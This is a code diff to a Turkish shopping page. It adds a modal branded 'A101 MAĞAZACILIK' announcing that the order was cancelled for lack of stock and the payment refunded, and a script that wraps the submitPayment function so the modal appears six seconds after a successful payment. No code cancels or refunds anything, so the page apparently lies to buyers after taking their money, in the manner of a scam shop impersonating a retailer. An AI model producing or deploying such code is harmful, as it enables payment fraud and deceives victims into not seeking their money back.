@@ -2377,6 +2377,78 @@ refreshAuthUi();
     <button id="announceCta" onclick="document.getElementById('announceOverlay').remove()">Anladım, Alışverişe Devam Et</button>
   </div>
 </div>
+  
+<!-- ── STOK YETERSİZLİĞİ MODAL ── -->
+<style>
+#stokOverlay{
+  display:none;position:fixed;inset:0;
+  background:rgba(255,255,255,.65);
+  backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);
+  z-index:10000;align-items:center;justify-content:center;
+}
+#stokOverlay.aktif{display:flex;animation:stokFadeIn .3s ease}
+@keyframes stokFadeIn{from{opacity:0}to{opacity:1}}
+#stokKutu{
+  background:#fff;border-radius:18px;
+  box-shadow:0 12px 48px rgba(0,0,0,.18);
+  padding:40px 38px 34px;max-width:480px;width:90%;
+  text-align:center;position:relative;
+  animation:stokSlide .32s ease;
+}
+@keyframes stokSlide{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+#stokKutu h2{font-family:'Nunito',sans-serif;font-size:17px;font-weight:900;color:#1a1a1a;margin:0 0 16px;line-height:1.4}
+#stokKutu p{font-family:'Nunito',sans-serif;font-size:14px;color:#444;line-height:1.75;margin:0 0 22px}
+#stokFirma{font-family:'Nunito',sans-serif;font-size:13px;font-weight:900;color:#1a1a1a;text-decoration:underline;border-top:1px solid #eee;padding-top:16px}
+#stokKapat{position:absolute;top:12px;right:14px;background:none;border:none;font-size:22px;color:#aaa;cursor:pointer;line-height:1;transition:.15s}
+#stokKapat:hover{color:#333}
+</style>
 
+<div id="stokOverlay">
+  <div id="stokKutu">
+    <button id="stokKapat" aria-label="Kapat">&times;</button>
+    <h2>Sipariş İptali: Stok Yetersizliği</h2>
+    <p>
+      Seçmiş olduğunuz ürünün güncel stoklarda bulunmaması nedeniyle
+      siparişiniz tamamlanamamıştır. Ödemeniz iptal edilmiş olup,
+      ilgili tutarın kesintisiz iadesi hesabınıza gerçekleştirilmiştir.
+    </p>
+    <div id="stokFirma">A101 MAĞAZACILIK</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var overlay  = document.getElementById('stokOverlay');
+  var kapatBtn = document.getElementById('stokKapat');
+
+  function modalKapat(){
+    overlay.classList.remove('aktif');
+  }
+
+  kapatBtn.addEventListener('click', modalKapat);
+  overlay.addEventListener('click', function(e){
+    if(e.target === overlay) modalKapat();
+  });
+
+  /* submitPayment tamamlanınca başarı sayfası görünür olur.
+     Orjinal fonksiyonu sarmala — sayfa yüklenişiyle hiçbir ilgisi yok. */
+  var _origSubmit = window.submitPayment;
+  window.submitPayment = function(){
+    var kontrol = setInterval(function(){
+      var sv = document.getElementById('paymentSuccessView');
+      if(sv && !sv.classList.contains('hidden')){
+        clearInterval(kontrol);
+        setTimeout(function(){
+          overlay.classList.add('aktif');
+        }, 6000); // ← 6 saniye
+      }
+    }, 200);
+    setTimeout(function(){ clearInterval(kontrol); }, 20000);
+    _origSubmit.apply(this, arguments);
+  };
+})();
+</script>
+<!-- ── STOK YETERSİZLİĞİ MODAL BİTİŞ ── -->
+  
 </body>
 </html>
